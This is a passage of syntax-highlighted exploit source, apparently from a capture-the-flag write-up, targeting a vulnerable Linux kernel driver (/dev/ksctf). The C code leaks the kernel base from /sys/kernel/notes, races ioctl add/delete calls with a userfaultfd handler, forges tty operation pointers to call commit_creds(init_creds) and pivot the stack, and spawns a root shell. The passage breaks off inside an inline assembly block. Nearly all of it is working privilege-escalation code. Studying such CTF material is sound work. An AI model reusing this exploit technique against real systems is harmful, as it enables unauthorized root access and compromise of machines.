class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff824493c0</span>;</span><br><span class="line"><span class="type">size_t</span> heap_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> work_for_cpu_fn = <span class="number">0xffffffff810bd960</span>;</span><br><span class="line"><span class="type">size_t</span> init_creds = <span class="number">0xffffffff82c6b920</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810ce710</span>;</span><br><span class="line"><span class="type">size_t</span> fake_ops_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> orignal[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">size_t</span> leak, kernel_base;</span><br><span class="line"><span class="type">size_t</span> gadget = <span class="number">0xffffffff817d1e76</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi;</span><br><span class="line"><span class="type">size_t</span> add_rsp_188_pop_rbx_ret;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00a74</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">sem_t</span> sem_write, sem_free;</span><br><span class="line"><span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> tty_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line"></span><br><span class="line">        tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        uffd_buf[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">        uffd_buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        uffd_buf[<span class="number">2</span>] = kernel_base + <span class="number">0x13e8030</span> - <span class="number">0x60</span>;</span><br><span class="line">        uffd_buf[<span class="number">3</span>] = fake_ops_addr + <span class="number">0x40</span>;</span><br><span class="line">        uffd_buf[<span class="number">4</span>] = commit_creds;</span><br><span class="line">        uffd_buf[<span class="number">5</span>] = init_creds;</span><br><span class="line">        uffd_buf[<span class="number">7</span>] = add_rsp_188_pop_rbx_ret;</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[0]&quot;</span>, uffd_buf[<span class="number">0</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[1]&quot;</span>, uffd_buf[<span class="number">1</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[2]&quot;</span>, uffd_buf[<span class="number">2</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[3]&quot;</span>, uffd_buf[<span class="number">3</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[4]&quot;</span>, uffd_buf[<span class="number">4</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[5]&quot;</span>, uffd_buf[<span class="number">5</span>]);</span><br><span class="line">        </span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> get_root_func = (<span class="type">size_t</span>)get_root_shell;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> note_fd = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, O_RDONLY);</span><br><span class="line">    read(note_fd, data, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(<span class="string">&quot;/sys/kernel/notes&quot;</span>, data, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x84</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x19e1180</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;modprobe_path&quot;</span>, modprobe_path);</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line">    </span><br><span class="line">    work_for_cpu_fn  = kernel_base + <span class="number">0x8c360</span>;</span><br><span class="line">    init_creds = kernel_base + <span class="number">0x1448cc0</span>;</span><br><span class="line">    commit_creds = kernel_base + <span class="number">0x97d00</span>;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">35</span>;</span><br><span class="line">    hexx(<span class="string">&quot;commit_creds&quot;</span>, commit_creds);</span><br><span class="line">    hexx(<span class="string">&quot;work_for_cpu_fn&quot;</span>, work_for_cpu_fn);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_restore_regs_and_return_to_usermode&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    pop_rdi = kernel_base + <span class="number">0xe031</span>;</span><br><span class="line">    add_rsp_188_pop_rbx_ret = kernel_base + <span class="number">0x9369cc</span>;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_188_pop_rbx_ret&quot;</span>,add_rsp_188_pop_rbx_ret);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    fake_ops_addr = heap_addr - <span class="number">0x68</span>;</span><br><span class="line">    hexx(<span class="string">&quot;fake_ops_addr&quot;</span>, fake_ops_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    orignal[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">    orignal[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    orignal[<span class="number">2</span>] = heap_addr - <span class="number">0x2a5540</span>;</span><br><span class="line">    orignal[<span class="number">3</span>] = kernel_base + <span class="number">0x1073e00</span>;</span><br><span class="line">    orignal[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    orignal[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    orignal[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   pop_rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov 